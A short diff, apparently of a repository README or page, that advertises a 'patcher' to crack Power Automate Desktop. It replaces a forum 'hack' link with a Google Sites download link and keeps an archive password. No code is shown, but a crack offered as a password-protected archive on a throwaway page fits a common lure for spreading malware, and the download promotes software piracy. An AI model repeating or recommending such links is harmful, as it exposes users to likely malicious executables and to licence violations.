@@ -31,9 +31,9 @@ Power Automate Desktop is a professional RPA tool for automating repetitive task
 
 Important: Download the patcher from the link below.
 
-Download: https://software-hub.forumotion.com/t43-power-automate-desktop-hack
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
